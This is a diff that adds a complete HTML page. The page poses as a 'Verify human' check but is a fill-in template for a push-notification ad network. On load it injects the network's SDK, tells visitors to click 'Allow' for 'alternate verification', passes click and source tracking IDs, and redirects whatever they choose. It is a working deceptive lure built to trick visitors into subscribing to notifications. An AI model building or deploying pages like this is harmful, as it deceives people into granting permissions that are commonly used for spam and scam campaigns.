@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify</title>
+    <style>
+        :root {
+            --primary: #4F46E5;
+            --bg: #050505;
+            --card: #FFFFFF;
+            --text: #111827;
+            --text-light: #6B7280;
+            --border: #E5E7EB;
+            --error: #EF4444;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 360px;
+        }
+        
+        .card {
+            background-color: var(--card);
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            overflow: hidden;
+        }
+        
+        .card-content {
+            padding: 32px 24px;
+            text-align: center;
+        }
+        
+        .verify-icon {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 24px;
+            color: var(--primary);
+        }
+        
+        .verify-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .verify-checkbox {
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 24px 0;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+        
+        .verify-checkbox:hover {
+            border-color: #D1D5DB;
+        }
+        
+        .checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid var(--border);
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            flex-shrink: 0;
+        }
+        
+        .checkbox.checked {
+            background-color: var(--primary);
+            border-color: var(--primary);
+        }
+        
+        .check-icon {
+            color: white;
+            width: 16px;
+            height: 16px;
+            display: none;
+        }
+        
+        .checkbox.checked .check-icon {
+            display: block;
+        }
+        
+        .checkbox-label {
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--text);
+        }
+        
+        .verify-button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .verify-button:hover:not(:disabled) {
+            background-color: #4338CA;
+        }
+        
+        .verify-button:disabled {
+            background-color: #C7D2FE;
+            cursor: not-allowed;
+        }
+        
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            display: none;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .verifying .spinner {
+            display: block;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(17, 24, 39, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+            backdrop-filter: blur(4px);
+            padding: 16px;
+        }
+        
+        .overlay.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .error-modal {
+            background-color: var(--card);
+            border-radius: 12px;
+            width: 100%;
+            max-width: 340px;
+            padding: 32px 24px;
+            text-align: center;
+        }
+        
+        .error-icon {
+            width: 44px;
+            height: 44px;
+            margin: 0 auto 20px;
+            color: var(--error);
+        }
+        
+        .error-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .error-message {
+            font-size: 14px;
+            color: var(--text-light);
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        
+        .notification-box {
+            background-color: #EEF2FF;
+            border-radius: 8px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 24px;
+        }
+        
+        .bell-icon {
+            width: 20px;
+            height: 20px;
+            color: var(--primary);
+        }
+        
+        .notification-text {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--primary);
+        }
+        
+        .arrow-icon {
+            width: 20px;
+            height: 20px;
+            margin: 0 auto 12px;
+            color: var(--primary);
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-10px);
+            }
+            60% {
+                transform: translateY(-5px);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="card-content">
+                <svg class="verify-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                </svg>
+                
+                <h1 class="verify-title">Verification</h1>
+                
+                <div class="verify-checkbox" id="verify-checkbox">
+                    <div class="checkbox" id="checkbox">
+                        <svg class="check-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                        </svg>
+                    </div>
+                    <span class="checkbox-label">Verify human</span>
+                </div>
+                
+                <button id="verify-button" class="verify-button" disabled>
+                    <div class="spinner"></div>
+                    Verify
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- ERROR MODAL - Currently unused but kept for future use -->
+    <div class="overlay" id="error-overlay">
+        <div class="error-modal">
+            <svg class="error-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+            </svg>
+            
+            <h2 class="error-title">Verification Failed</h2>
+            <p class="error-message">Enable notifications for alternate verification</p>
+            
+            <svg class="arrow-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M5 10l7-7m0 0l7 7m-7-7v18" />
+            </svg>
+            
+            <div class="notification-box">
+                <svg class="bell-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
+                </svg>
+                <span class="notification-text">Click "Allow" when prompted</span>
+            </div>
+        </div>
+    </div>
+    
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const verifyCheckbox = document.getElementById('verify-checkbox');
+        const checkbox = document.getElementById('checkbox');
+        const verifyButton = document.getElementById('verify-button');
+
+        // Helper function to get query parameter from URL
+        function getQueryParam(name) {
+            const params = new URLSearchParams(window.location.search);
+            return params.get(name);
+        }
+
+        // Extract click_id and source_id from current URL
+        const clickId = getQueryParam("click_id") || "";
+        const sourceId = getQueryParam("source_id") || "";
+
+        // Handle checkbox click
+        verifyCheckbox.addEventListener('click', function() {
+            checkbox.classList.toggle('checked');
+            verifyButton.disabled = !checkbox.classList.contains('checked');
+        });
+        
+        // Handle verify button click
+        verifyButton.addEventListener('click', function() {
+            this.classList.add('verifying');
+
+            setTimeout(() => {
+                // ⚠️ CHANGE THIS: Replace with YOUR GitHub Pages URL
+                const redirectUrl =
+                    "https://YOUR-GITHUB-USERNAME.github.io/YOUR-NEXT-PAGE-REPO/?" +
+                    "click_id=" + encodeURIComponent(clickId) +
+                    "&source_id=" + encodeURIComponent(sourceId);
+
+                window.location.href = redirectUrl;
+            }, 2000);
+        });
+    });
+</script>
+
+<script async data-cfasync="false">
+    (function() {
+        const url = new URL(window.location.href);
+        const clickID = url.searchParams.get("click_id") || "";
+        const sourceID = url.searchParams.get("source_id") || "";
+
+        // Function to replace placeholders in a URL
+        function replacePlaceholders(link) {
+            return link
+                .replace("{click_id}", encodeURIComponent(clickID))
+                .replace("{source_id}", encodeURIComponent(sourceID));
+        }
+
+        // Create the SDK script
+        const s = document.createElement("script");
+        s.dataset.cfasync = "false";
+        
+        // ⚠️ CHANGE THIS: Replace with YOUR push network's SDK URL and Zone ID
+        s.src = "/sdk.js?z=YOUR-ZONE-ID-HERE";
+
+        s.onload = (opts) => {
+            // ⚠️ CHANGE THIS: Replace with YOUR Zone ID (same as above)
+            opts.zoneID = YOUR-ZONE-ID-HERE;
+            opts.extClickID = clickID;
+            opts.subID1 = sourceID;
+
+            // ⚠️ CHANGE THIS: Replace with YOUR GitHub Pages URL (same as first script)
+            const redirectURL = replacePlaceholders(
+                "https://YOUR-GITHUB-USERNAME.github.io/YOUR-NEXT-PAGE-REPO/?click_id={click_id}&source_id={source_id}"
+            );
+
+            // Define all event actions
+            opts.actions.onPermissionGranted = () => {
+                window.location.replace(redirectURL);
+            };
+            opts.actions.onPermissionDenied = () => {
+                window.location.replace(redirectURL);
+            };
+            opts.actions.onAlreadySubscribed = () => {
+                window.location.replace(redirectURL);
+            };
+            opts.actions.onError = () => {
+                window.location.replace(redirectURL);
+            };
+        };
+
+        document.head.appendChild(s);
+    })();
+</script>
+</body>
+</html>
